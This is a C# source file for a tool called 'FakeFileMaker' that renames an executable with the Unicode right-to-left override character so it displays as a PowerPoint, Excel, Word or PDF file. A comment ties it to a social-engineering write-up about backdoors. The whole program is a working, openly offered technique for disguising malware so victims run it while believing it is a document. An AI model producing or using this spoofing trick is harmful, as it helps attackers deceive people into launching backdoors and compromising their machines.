using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace FakeFileMaker
{
    class Program
    {
        static void Main(string[] args)
        {
            // for Step by Step and more information about this tool please visit this link :
            // https://www.linkedin.com/pulse/social-engineering-simple-way-make-fake-file-backdoor-mohammadbagher

            //U202A: LEFT - TO - RIGHT EMBEDDING(LRE)
            //U202B: RIGHT - TO - LEFT EMBEDDING(RLE)
            //U202D:   LEFT - TO - RIGHT OVERRIDE(LRO)
            //U202E:   RIGHT - TO - LEFT OVERRIDE(RLO)
            //U202C: POP DIRECTIONAL FORMATTING(PDF)
            const string RLO = "\u202E";
        start:
            Console.WriteLine(" ");
            Console.WriteLine("[-] Welcome to fake File Maker ;D");
            Console.WriteLine("[-] Published by Damon Mohammadbagher (November 2016)");
            Console.WriteLine("[x] Warning : Input File with EXE Extension only Allowed ;D ");
            Console.WriteLine(" ");
            Console.WriteLine("[+] Please Select Number : ");
            Console.WriteLine(" ");
            Console.WriteLine("[{0}] Make Fake Powerpoint File  ", "1");
            Console.WriteLine("[{0}] Make Fake Excel File ", "2");
            Console.WriteLine("[{0}] Make Fake Word File  ", "3");
            Console.WriteLine("[{0}] Make Fake PDF File  ", "4");
            Console.WriteLine("[{0}] Make Fake any File  ", "5");
            Console.WriteLine(" ");
            Console.WriteLine("########### use Ctrl+C for Exit ##############");
            Console.WriteLine(" ");
            Console.Write("[+] Select :");           
            string input = Console.ReadLine();
            string input_SFN = "";
            string input_DFN = "";
            Console.WriteLine("[#] ");
            Console.WriteLine(" ");
           
            Console.WriteLine("[#] Source File name , example : 'Myfile.exe' : ");
             input_SFN = Console.ReadLine();
            Console.WriteLine("[#] ");
            Console.WriteLine("[#] For Make Fake File Please input New File name only (without file extension) , example : 'NewName' : ");
             input_DFN = Console.ReadLine();
            Console.WriteLine("[#] ");           

            try
            {


                switch (input)
                {
                    case "1":
                        {
                            // little trick for better changing name ==> "mynewfileexe.cutionresume.ppt"                          
                            System.IO.File.Move(input_SFN, input_DFN + RLO + "tpp.emuser" + RLO + "noituc.exe");
                            
                           // System.IO.File.Move(input_SFN, input_DFN + RLO + "tpp.exe");
                           // Console.WriteLine("Output : " + input_DFN + RLO + "tpp.exe");
                            break;
                        }
                    case "2":
                        {
                            System.IO.File.Move(input_SFN, input_DFN + RLO + "slx.exe");
                            Console.WriteLine("Output : " + input_DFN + RLO + "slx.exe");
                            break;
                        }
                    case "3":
                        {
                            System.IO.File.Move(input_SFN, input_DFN + RLO + "cod.exe");
                            Console.WriteLine("Output : " + input_DFN + RLO + "cod.exe");
                            break;
                        }
                    case "4":
                        {
                            System.IO.File.Move(input_SFN, input_DFN + RLO + "fdp.exe");
                            Console.WriteLine("Output : " + input_DFN + RLO + "fdp.exe");
                            break;
                        }
                    case "5":
                        {
                           //.. do something....
                            break;
                        }

                    default:
                        break;
                }
            }
            catch (Exception)
            {

                goto start;
            }
            goto start;
           
        }
    }
}

// for Step by Step and more information about this tool please visit this link :
// https://www.linkedin.com/pulse/social-engineering-simple-way-make-fake-file-backdoor-mohammadbagher
